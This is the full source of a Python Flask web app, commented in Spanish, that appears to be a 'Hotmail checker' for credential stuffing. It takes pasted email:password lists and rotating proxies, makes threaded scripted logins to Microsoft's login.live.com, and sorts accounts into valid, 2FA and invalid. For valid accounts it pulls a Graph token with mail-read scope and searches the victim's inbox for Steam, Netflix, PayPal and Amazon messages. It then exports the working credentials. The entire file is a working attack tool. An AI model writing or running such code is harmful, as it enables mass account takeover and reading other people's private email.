import os
import re
import time
import random
import threading
import concurrent.futures
import requests
import urllib3
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

# Configuración
PORT = int(os.environ.get('PORT', 5000))

# Estado global del checker
checker_state = {
    'running': False,
    'stats': {
        'valid': 0,
        'inbox': 0,
        '2fa': 0,
        'bad': 0,
        'checked': 0,
        'errors': 0,
        'cpm': 0,
        'total': 0
    },
    'results': {
        'valid': [],
        'inbox': [],
        '2fa': [],
        'bad': []
    },
    'logs': [],
    'start_time': None
}

# ============================================
# CLASE MICROSOFT CHECKER (REAL)
# ============================================

class MicrosoftChecker:
    def __init__(self, email, password, proxy=None, keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.keywords = keywords or ["Steam", "Netflix", "PayPal", "Amazon"]
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.country = 'Unknown'
        self.name = 'Unknown'
    
    def get_login_data(self):
        """Obtiene datos de login"""
        try:
            url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            r = self.session.get(url, headers=headers, timeout=15)
            text = r.text
            
            # Buscar sFTTag
            sFTTag = None
            match = re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
            if not match:
                match = re.search(r'sFTTag:\'(.+?)\'', text, re.S)
            if match:
                sFTTag = match.group(1)
            
            # Buscar urlPost
            urlPost = None
            match = re.search(r'<form.*?action="(.+?)"', text, re.S)
            if match:
                urlPost = match.group(1).replace('&amp;', '&')
            
            return urlPost, sFTTag
        except:
            return None, None
    
    def login(self):
        """Intenta login"""
        urlPost, sFTTag = self.get_login_data()
        if not urlPost or not sFTTag:
            return 'ERROR'
        
        try:
            data = {
                'login': self.email,
                'loginfmt': self.email,
                'passwd': self.password,
                'PPFT': sFTTag
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            r = self.session.post(urlPost, data=data, headers=headers, 
                                 allow_redirects=True, timeout=15)
            
            # Verificar éxito
            if '#' in r.url and 'access_token' in r.url:
                return 'SUCCESS'
            
            # Verificar 2FA
            if any(x in r.text for x in ['recover?mkt', 'identity/confirm', 'Abuse?mkt=']):
                return '2FA'
            
            # Verificar fallo
            if any(x in r.text.lower() for x in [
                'password is incorrect',
                "account doesn't exist",
                'too many times'
            ]):
                return 'BAD'
            
            return 'BAD'
        except:
            return 'ERROR'
    
    def get_graph_token(self):
        """Obtiene token Graph API"""
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read'
            url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(url, timeout=15)
            parsed = parse_qs(urlparse(r.url).fragment)
            return parsed.get('access_token', [None])[0]
        except:
            return None
    
    def get_profile(self):
        """Obtiene perfil del usuario"""
        token = self.get_graph_token()
        if not token:
            return False
        
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.get('https://graph.microsoft.com/v1.0/me', 
                               headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', 'Unknown')
                self.name = data.get('displayName', 'Unknown')
                return True
        except:
            pass
        
        return False
    
    def check_inbox(self):
        """Busca keywords en el inbox"""
        token = self.get_graph_token()
        if not token:
            return 0, []
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        
        total = 0
        hits = []
        
        for keyword in self.keywords:
            try:
                url = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject&$top=10"
                r = self.session.get(url, headers=headers, timeout=10)
                
                if r.status_code == 200:
                    data = r.json()
                    count = data.get('@odata.count', len(data.get('value', [])))
                    if count > 0:
                        total += count
                        hits.append(f"{keyword}: {count}")
            except:
                pass
        
        return total, hits


# ============================================
# FUNCIONES DE PROCESAMIENTO
# ============================================

def parse_accounts(text):
    """Parsea cuentas"""
    accounts = []
    for line in text.split('\n'):
        line = line.strip()
        if not line or '@' not in line:
            continue
        
        # Probar separadores
        for sep in [':', '|', ';', ',', '\t']:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2 and '@' in parts[0]:
                    accounts.append(f"{parts[0].strip()}:{parts[1].strip()}")
                    break
    return accounts

def parse_keywords(text):
    """Parsea keywords"""
    return [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]

def parse_proxies(text):
    """Parsea proxies"""
    proxies = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('http'):
                proxies.append(line)
            elif '@' in line:
                proxies.append(f"http://{line}")
            else:
                proxies.append(f"http://{line}")
    return proxies

def add_log(message, level='info'):
    """Añade log"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    checker_state['logs'].insert(0, {
        'time': timestamp,
        'message': message,
        'level': level
    })
    if len(checker_state['logs']) > 500:
        checker_state['logs'] = checker_state['logs'][:500]

def check_account(email, password, keywords, proxies):
    """Verifica una cuenta"""
    if not checker_state['running']:
        return
    
    try:
        proxy = random.choice(proxies) if proxies else None
        checker = MicrosoftChecker(email, password, proxy, keywords)
        
        status = checker.login()
        
        if status == 'SUCCESS':
            checker.get_profile()
            country = checker.country or 'Unknown'
            
            count, hits = checker.check_inbox()
            
            if count > 0:
                checker_state['stats']['inbox'] += 1
                checker_state['results']['inbox'].append(f"{email}:{password} | {country} | {count} emails | {', '.join(hits)}")
                add_log(f"📬 {email} - INBOX HITS: {count} emails ({country})", 'success')
            else:
                checker_state['stats']['valid'] += 1
                checker_state['results']['valid'].append(f"{email}:{password} | {country}")
                add_log(f"✅ {email} - VALID ({country})", 'success')
                
        elif status == '2FA':
            checker_state['stats']['2fa'] += 1
            checker_state['results']['2fa'].append(f"{email}:{password}")
            add_log(f"🔐 {email} - 2FA REQUIRED", 'warning')
            
        else:
            checker_state['stats']['bad'] += 1
            checker_state['results']['bad'].append(f"{email}:{password}")
            add_log(f"❌ {email} - INVALID", 'error')
            
    except Exception as e:
        checker_state['stats']['errors'] += 1
        add_log(f"⚠️ {email} - ERROR: {str(e)}", 'error')
    
    finally:
        checker_state['stats']['checked'] += 1
        # Actualizar CPM
        if checker_state['start_time']:
            elapsed = time.time() - checker_state['start_time']
            if elapsed > 0:
                checker_state['stats']['cpm'] = int(checker_state['stats']['checked'] / elapsed * 60)


# ============================================
# RUTAS DE LA API
# ============================================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_checking():
    if checker_state['running']:
        return jsonify({'error': 'Already running'}), 400
    
    data = request.json
    accounts = parse_accounts(data.get('accounts', ''))
    keywords = parse_keywords(data.get('keywords', ''))
    proxies = parse_proxies(data.get('proxies', ''))
    threads = int(data.get('threads', 50))
    
    if not accounts:
        return jsonify({'error': 'No valid accounts found'}), 400
    
    if not keywords:
        keywords = ['Steam', 'Netflix', 'PayPal', 'Amazon']
    
    # Resetear estado
    checker_state['running'] = True
    checker_state['stats'] = {
        'valid': 0, 'inbox': 0, '2fa': 0, 'bad': 0,
        'checked': 0, 'errors': 0, 'cpm': 0, 'total': len(accounts)
    }
    checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': []}
    checker_state['logs'] = []
    checker_state['start_time'] = time.time()
    
    add_log(f"🚀 Iniciando verificación de {len(accounts)} cuentas", 'info')
    add_log(f"📝 Keywords: {', '.join(keywords)}", 'info')
    add_log(f"📡 Proxies: {len(proxies)}", 'info')
    add_log(f"⚙️ Hilos: {threads}", 'info')
    
    # Ejecutar en hilo separado
    thread = threading.Thread(target=run_checker, args=(accounts, keywords, proxies, threads))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'total': len(accounts)
    })

def run_checker(accounts, keywords, proxies, max_threads):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for account in accounts:
                if not checker_state['running']:
                    break
                email, password = account.split(':', 1)
                future = executor.submit(check_account, email, password, keywords, proxies)
                futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                if not checker_state['running']:
                    break
                try:
                    future.result()
                except:
                    pass
    finally:
        checker_state['running'] = False
        elapsed = time.time() - checker_state['start_time']
        add_log(f"✅ Verificación completada en {int(elapsed)}s", 'success')
        add_log(f"📊 Válidos: {checker_state['stats']['valid']} | Inbox: {checker_state['stats']['inbox']} | 2FA: {checker_state['stats']['2fa']} | Inválidos: {checker_state['stats']['bad']}", 'info')

@app.route('/api/stop', methods=['POST'])
def stop_checking():
    checker_state['running'] = False
    add_log("⏹️ Detenido por el usuario", 'warning')
    return jsonify({'success': True})

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify({
        'running': checker_state['running'],
        'stats': checker_state['stats'],
        'logs': checker_state['logs'][:30],
        'results': checker_state['results']
    })

@app.route('/api/export', methods=['POST'])
def export_results():
    lines = ['=== HOTMAIL CHECKER RESULTS ===']
    lines.append(f'Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    lines.append('')
    
    if checker_state['results']['valid']:
        lines.append('--- VALID ACCOUNTS ---')
        lines.extend(checker_state['results']['valid'])
        lines.append('')
    
    if checker_state['results']['inbox']:
        lines.append('--- INBOX HITS ---')
        lines.extend(checker_state['results']['inbox'])
        lines.append('')
    
    if checker_state['results']['2fa']:
        lines.append('--- 2FA ACCOUNTS ---')
        lines.extend(checker_state['results']['2fa'])
        lines.append('')
    
    if checker_state['results']['bad']:
        lines.append('--- INVALID ACCOUNTS ---')
        lines.extend(checker_state['results']['bad'])
    
    content = '\n'.join(lines)
    filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return send_file(filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)